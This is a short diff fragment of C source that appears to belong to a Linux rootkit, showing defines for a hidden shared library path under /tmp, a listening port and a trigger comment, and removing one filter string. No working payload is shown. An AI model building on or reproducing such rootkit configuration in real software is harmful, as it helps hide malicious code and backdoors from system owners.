@@ -13,7 +13,6 @@
 //compile the rootkit shared library to this path
 #define Shared_Lib_Path "/tmp/.MY_ROOTKIT.so"
 #define PORT  18880
-#define  FILTER "boob"
 
 //making this for triggering sig
 // useless static int TRIGGER = 0;
